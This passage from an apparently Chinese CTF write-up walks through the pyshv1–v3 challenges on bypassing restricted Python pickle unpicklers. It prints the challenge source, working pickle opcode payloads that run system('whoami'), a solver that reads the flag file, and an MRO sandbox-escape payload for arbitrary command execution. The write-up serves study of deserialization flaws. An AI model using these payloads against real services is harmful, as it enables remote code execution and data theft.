class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><br>whitelist = []<br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        <span class="hljs-keyword">return</span> pickle.Unpickler.find_class(self, module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> sys<br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;sys&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.login()<br>        self.cmds = &#123;&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = self.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br></code></pre></td></tr></table></figure><p>限制条件如下：</p><ol type="1"><li>只能引入 sys 模块</li><li>方法中不能有 <code>.</code></li></ol><p>这题比较简单，利用方法覆盖的思路，<code>sys.modules.get("os").system("whoami")</code> 就可以了，转为 opcode 即为：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">csys<span class="hljs-symbol">\n</span>modules<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>0g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g0<span class="hljs-symbol">\n</span>scsys<span class="hljs-symbol">\n</span>get<span class="hljs-symbol">\n</span>(Vos<span class="hljs-symbol">\n</span>tR  # 到这里和上面方法覆盖中的 payload 一样<br>p1<span class="hljs-symbol">\n</span>0  # 把 os 存下来先，然后清空栈<br>g0<span class="hljs-symbol">\n</span>Vsys<span class="hljs-symbol">\n</span>g1<span class="hljs-symbol">\n</span>s   # 引入 sys.modules 并令 sys.modules[&quot;sys&quot;] = os，这个思路还是方法覆盖<br>csys<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>tR.  # 执行命令<br></code></pre></td></tr></table></figure></p><p>在经过两轮覆盖 sys 之后，就可以执行任意命令了：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/b27d5d62-53a7-4aab-9505-289c28ddca40.png!blog#width-zoom8" /></p><h3 id="pyshv2">pyshv2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- structs.py ----- </span><br><span class="hljs-comment"># structs.py 是一个空文件</span><br><br><br><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = []<br><br><br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        module = <span class="hljs-built_in">__import__</span>(module)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> sys<br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;structs&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.login()<br>        self.cmds = &#123;<br>            <span class="hljs-string">&#x27;help&#x27;</span>: self.cmd_help,<br>            <span class="hljs-string">&#x27;flag&#x27;</span>: self.cmd_flag,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-keyword">raise</span> NotImplementedError(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = self.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_help</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Available commands: &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join(self.cmds.keys()))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_su</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br>        <span class="hljs-comment"># self.user.privileged = 1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br><br></code></pre></td></tr></table></figure><p>这道题难度提升了不少。限制如下：</p><ol type="1"><li>只能引入 structs 模块</li><li>方法中不能有 <code>.</code></li></ol><p>上一道题利用方法覆盖，依赖的是可引入模块中的某些特殊方法。我们先来看下 <code>structs</code> 都有哪些属性：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/58557963-7381-4e39-bfa1-d4bdcfcebee8.png!blog#width-zoom2" /></p><p>再看下都有哪些方法：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/e400d051-3362-46e3-af15-d0095180097f.png!blog#width-zoom3" /></p><p><code>__builtins__</code>、<code>__getattribute__</code> 都是好东西。</p><p>思路首先可以是 <code>structs.__builtins__["eval"]("__import__('os').system('whoami')")</code>，可是这里的 <code>"eval"</code> 是不好 get 的。</p><p>我们可以从后往前推。</p><p><code>("__import__('os').system('whoami')")</code>，这个好解决，用 <code>c</code> 就行了。重点是 <code>structs.__builtins__["eval"]</code> 这个怎么搞出来。由于自定义的 find_class 用到了 <code>__import__</code>，所以 <code>cstructs\n__builtins__</code> 就会执行 <code>__import__("structs")</code>。那么可以这样，首先，给 structs 加一个属性：<code>structs.__dict__["p0"] = structs.__builtins__</code>，再解开一层，给 structs 加一个属性：<code>structs.__dict__["p1"] = structs.__dict__["p0"].get</code>，那么 <code>cstructs\np1\n(Veval\ntR.</code> 就会执行 <code>structs.__builtins__.get("eval")</code>，所以这里的 opcode 就是：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cstructs<span class="hljs-symbol">\n</span>__dict__<span class="hljs-symbol">\n</span>p0<br>(Vp0<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>__builtins__<span class="hljs-symbol">\n</span>s<br>(Vp1<span class="hljs-symbol">\n</span>g0.get<span class="hljs-symbol">\n</span>s  # 这里是不行的<br>cstructs<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>(Veval<span class="hljs-symbol">\n</span>tR(V__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure><br />遗憾的是，opcode 是不支持用 <code>.</code> 来取属性/方法的。</p><p>所以现在的问题就变成了，<code>.get</code> 这个方法怎么搞出来。</p><p>再看下 find_class：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">module = <span class="hljs-built_in">__import__</span>(module)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br></code></pre></td></tr></table></figure></p><p>所以如果 module 是一个字典的话，那么 name 就可以置为 get，即 <code>__import__("structs")</code> 的结果应该是一个字典。而 <code>__import__</code> 是可以被替换的，<code>__getattribute__</code> 就派上了用场，令 <code>structs.__builtins__['__import__'] = structs.__getattribute__</code>。所以，我们还得给 structs 新增一个 structs 属性：<code>structs.__dict__["structs"] = structs.__builtins__</code>。</p><p>到这里:<br /><code>__import__(module)</code> 等于<br /><code>structs.__getattribute__("structs")</code> 等于<br /><code>structs.__builtins__</code></p><p>所以 module 已经是 <code>structs.__builtins__</code> 了，只需要让 <code>name = "get"</code> 即可拿到 <code>eval</code>：<br /><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># structs.<span class="hljs-strong">__dict__</span>[&quot;structs&quot;] = structs.<span class="hljs-strong">__builtins__</span></span><br>cstructs\n<span class="hljs-strong">__dict__</span>\nVstructs\ncstructs\n<span class="hljs-strong">__builtins__</span>\ns0<br><br><span class="hljs-section"># structs.<span class="hljs-strong">__builtins__</span>[&#x27;<span class="hljs-strong">__import__</span>&#x27;] = structs.<span class="hljs-strong">__getattribute__</span></span><br>cstructs\n<span class="hljs-strong">__builtins__</span>\nV<span class="hljs-strong">__import__</span>\ncstructs\n<span class="hljs-strong">__getattribute__</span>\ns0<br><br><span class="hljs-section"># get eval</span><br>cstructs\nget\n(Veval\ntR(V<br><br><span class="hljs-section"># get flag</span><br><br><span class="hljs-section"># 收工</span><br>\ntR.<br></code></pre></td></tr></table></figure></p><p>这样即可获得 flag<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> structs<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = [<span class="hljs-string">&quot;structs&quot;</span>]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        module = <span class="hljs-built_in">__import__</span>(module)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br><br><br>dumps = pickle.dumps<br><br>a = <span class="hljs-string">b&#x27;&#x27;&#x27;cstructs\n__dict__\nVstructs\ncstructs\n__builtins__\ns0cstructs\n__builtins__\nV__import__\ncstructs\n__getattribute__\ns0cstructs\nget\n(Veval\ntR(&#x27;&#x27;&#x27;</span> + \<br>    <span class="hljs-string">b&#x27;&#x27;&#x27;Vprint(open(&quot;./flag&quot;).read())\ntR.&#x27;&#x27;&#x27;</span><br>b = RestrictedUnpickler(io.BytesIO(a)).load()<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/a7803561-799c-4c0d-9e25-cee4ed6ac81d.png!blog#width-zoom5" /></p><p>如果只是为了拿到 flag，用 <code>open("./flag").read()</code> 也可以。但我们总是会想想能不能 RCE，那么这道题可以 RCE 吗？你可能会想，opcode 里面已经把 <code>__import__</code> 污染了，所以没法 import 其他的包来 RCE。</p><p>实际上是可以的。同样，在我之前写的《Python 沙箱逃逸的经验总结》（见资料 1）里有用 mro 来实现无 import 执行任意命令的方法。我这里就不啰嗦了，直接给出 opcode：<br /><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># structs.<span class="hljs-strong">__dict__</span>[&quot;structs&quot;] = structs.<span class="hljs-strong">__builtins__</span></span><br>cstructs\n<span class="hljs-strong">__dict__</span>\nVstructs\ncstructs\n<span class="hljs-strong">__builtins__</span>\ns0<br><br><span class="hljs-section"># structs.<span class="hljs-strong">__builtins__</span>[&#x27;<span class="hljs-strong">__import__</span>&#x27;] = structs.<span class="hljs-strong">__getattribute__</span></span><br>cstructs\n<span class="hljs-strong">__builtins__</span>\nV<span class="hljs-strong">__import__</span>\ncstructs\n<span class="hljs-strong">__getattribute__</span>\ns0<br><br><span class="hljs-section"># get eval</span><br>cstructs\nget\n(Veval\ntR(V<br><br><span class="hljs-section"># 利用 mro 寻找可利用的模块，这里以 sys 为例</span><br>[<span class="hljs-string">x for x in [</span>].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() if x.<span class="hljs-strong">__name__</span> == &quot;<span class="hljs-emphasis">_Printer&quot;][0]._</span>Printer<span class="hljs-strong">__setup.__</span>globals<span class="hljs-strong">__[&#x27;sys&#x27;].modules.get(&quot;os&quot;).system(&quot;whoami&quot;)</span><br><span class="hljs-strong"></span><br><span class="hljs-strong"># 收工</span><br><span class="hljs-strong">\ntR.</span><br></code></pre></td></tr></table></figure></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/34d78bf0-8b15-40ec-9119-63a6f7bc15b9.png!blog#width-zoom7" /></p><h3 id="pyshv3">pyshv3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = []<br><br><br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        <span class="hljs-keyword">return</span> pickle.Unpickler.find_class(self, module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> os<br><br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;structs&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.key = os.urandom(<span class="hljs-number">100</span>)<br>        self.login()<br>        self.cmds = &#123;<br>            <span class="hljs-string">&#x27;help&#x27;</span>: self.cmd_help,<br>            <span class="hljs-string">&#x27;whoami&#x27;</span>: self.cmd_whoami,<br>            <span class="hljs-string">&#x27;su&#x27;</span>: self.cmd_su,<br>            <span class="hljs-string">&#x27;flag&#x27;</span>: self.cmd_flag,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            flag = f.read()<br>        flag = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.key, flag))<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Login as &#x27;</span> + user.name + <span class="hljs-string">&#x27; - &#x27;</span> + user.group)<br>        user.privileged = <span class="hljs-literal">False</span><br>        user.flag = flag<br>        self.user = user<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = self.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_help</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Available commands: &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join(self.cmds.keys()))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_whoami</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.user.name, self.user.group)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_su</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br>        <span class="hljs-comment"># self.user.privileged = 1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.user.privileged:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag: Permission denied&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.user.flag, self.key)))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br><br><br><br><span class="hljs-comment">#  ----- structs.py ----- </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, group</span>):<br>        self.name = name<br>        self.group = group<br>        self.isadmin = <span class="hljs-number">0</span><br>        self.prompt = <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>这道题也比较难。限制如下：</p><ol type="1"><li>只能引入 structs 模块</li><li>方法中不能有 <code>.</code></li><li>无法 import 额外的模块。所以要想拿到 flag，<code>self.user.privileged</code> 需要不为 False</li></ol><p>由于 <code>user.privileged = False</code> 是在反序列化之后运行的，所以就算覆盖了 struct 的 privileged，也会被强制改回来。</p><p>我们知道，Python 的点运算符，背后实际上是各种描述器在起作用，而描述器其实由 <code>__getattribute__()</code> 方法调用的。所以这里的思路就是修改描述器使得 <code>.</code> 的行为可控。对于描述器我们并不陌生，如果你没用过，可以看下官方文档，见资料 